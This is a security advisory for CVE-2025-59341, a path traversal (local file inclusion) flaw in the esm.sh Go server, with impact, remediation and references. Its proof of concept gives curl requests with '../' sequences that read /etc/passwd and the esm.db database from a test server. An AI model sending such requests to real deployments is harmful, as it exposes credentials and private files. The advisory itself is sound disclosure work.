# [H] esm.sh has File Inclusion issue

## Summary
Severity: High
Advisory: GHSA-49pv-gwxp-532r
CVE: CVE-2025-59341
CWE: CWE-23
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2025-09-17
Source: https://github.com/advisories/GHSA-49pv-gwxp-532r
Type: github-advisory

## Affected
- Go: `github.com/esm-dev/esm.sh` — affected >=0

## Details
## Summary

A Local File Inclusion (LFI) issue was identified in the esm.sh service URL handling. An attacker could craft a request that causes the server to read and return files from the host filesystem (or other unintended file sources).

**Severity:** High — LFI can expose secrets, configuration files, credentials, or enable further compromise.
**Impact:** reading configuration files, private keys, environment files, or other sensitive files; disclosure of secrets or credentials; information leakage that could enable further attacks.

Vulnerable code snippet is in this file: https://github.com/esm-dev/esm.sh/blob/c62f191d32639314ff0525d1c3c0e19ea2b16143/server/router.go#L1168

---

## Proof of Concept

1. Using this default config file that I copy from the repo, the server is running at  `http://localhost:9999` with this command `go run server/esmd/main.go --config=config.json`


```json
{
  "port": 9999,
  "npmRegistry": "https://registry.npmjs.org/",
  "npmToken": "******"
}

```

2. Trigger the LFI vulnerability by sending this command below to read a local file

```bash
# read /etc/passwd
curl --path-as-is 'http://localhost:9999/pr/x/y@99/../../../../../../../../../../etc/passwd?raw=1&module=1'

# or read the database esm.db file
curl --path-as-is 'http://localhost:9999/pr/x/y@99/../../../../../../../esm.db?raw=1&module=1'
```

<img width="3338" height="1906" alt="poc-image" src="https://github.com/user-attachments/assets/f3721e5d-a09c-4227-960a-35279ff52811" />


---

## Remediation

Simply remove any `..` in the URL path before actually process the file. See more details in [this guide](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)

## Credits

- [Ai Ho (Jessie)](https://github.com/j3ssie)
- [CL Yang](https://github.com/A11riseforme)

## References
- https://github.com/esm-dev/esm.sh/security/advisories/GHSA-49pv-gwxp-532r
- https://nvd.nist.gov/vuln/detail/CVE-2025-59341
- https://github.com/esm-dev/esm.sh/commit/492de92850dd4d350c8b299af541f87541e58a45
- https://github.com/esm-dev/esm.sh
- https://github.com/esm-dev/esm.sh/blob/c62f191d32639314ff0525d1c3c0e19ea2b16143/server/router.go#L1168
- https://pkg.go.dev/vuln/GO-2025-3962
